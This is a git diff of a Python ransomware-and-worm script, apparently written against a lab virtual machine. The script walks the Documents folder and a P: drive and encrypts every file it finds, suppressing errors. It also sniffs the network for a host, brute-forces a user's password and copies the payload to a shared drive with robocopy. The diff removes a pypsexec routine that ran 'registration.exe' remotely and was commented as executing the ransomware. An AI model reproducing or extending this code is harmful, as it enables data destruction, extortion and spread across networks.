@@ -9,24 +9,29 @@ from pypsexec.client import Client #Sending remote commands
 
 #Walkthrough the Documents folder and the P: drive
 def fileWalk():
-    path= "C:\\Users\\IEUsers\\Documents"
+    path= "C:/Users/IEUsers/Documents"
     files=[]
     for r, d, f in os.walk(path):
         for file in f:
             files.append(os.path.join(r,file))
         for f in files:
-            encrypt(f)
-    fileWalkP()
+            try:
+                encrypt(f)
+            except:
+                pass
+    
 
 def fileWalkP():
-    path= "P:\\"
+    path= "P:/"
     files=[]
     for r, d, f in os.walk(path):
         for file in f:
             files.append(os.path.join(r,file))
         for f in files:
-            encrypt(f)
-
+            try:
+                encrypt(f)
+            except:
+                pass
 
 #def encrypt file
 def encrypt(fileLocation):
@@ -41,8 +46,8 @@ def encrypt(fileLocation):
 
 #play video
 def playVideo():
-    os.system("cd C:\\Users\\IEUser\\Downloads")
-    #CHANGE BACKGROUD
+    os.system("start C:/Users/IEUser/Downloads/Registration/Iam.mp4")
+    #CHANGE BACKGROUND
 
 
 # sniff network 
@@ -67,27 +72,18 @@ def bruteForce(user, ipAddress):
 
 #Transfer
 def transferFile():
-    os.system("robocopy C:\\Users\\IEUser\Downloads P:\\  ") #P:\\ zip folder
-    os.system("robocopy P:\\ C:\\Users\\IEUser\Downloads  ")#Fresh copy to start thr cycle again 
+    os.system("robocopy C:/Users/IEUser/Downloads/Registration P:/Registration  ") #P:\\ zip folder
 
-
-#Remote execute file
-def remoteExecute(ipAddress, user, password):
-    c = Client(ipAddress, username=user, password=password,  encrypt=False)
-    c.connect()
-    try:
-        c.create_service()
-        stdout, stderr, rc = c.run_executable("P:\\registration.exe") #Execute ransomware from P Drive
-    except:
-        print("done")
 
 def main():
     user= "IEUser"
-    fileWalk()
-    playVideo()
+    fileWalk() #1
+    fileWalkP() #2
+    playVideo() #3
     ipAddress= sniffNetwork()
-    print(ipAddress)
-    password=bruteForce(user,ipAddress)
-    print(password)
-    remoteExecute(ipAddress,user, password)
+    print(ipAddress) #Should print 192.168.0.60
+    password=bruteForce(user,ipAddress) 
+    print(password)#should return Passw0rd!
+    transferFile()
+
 main()
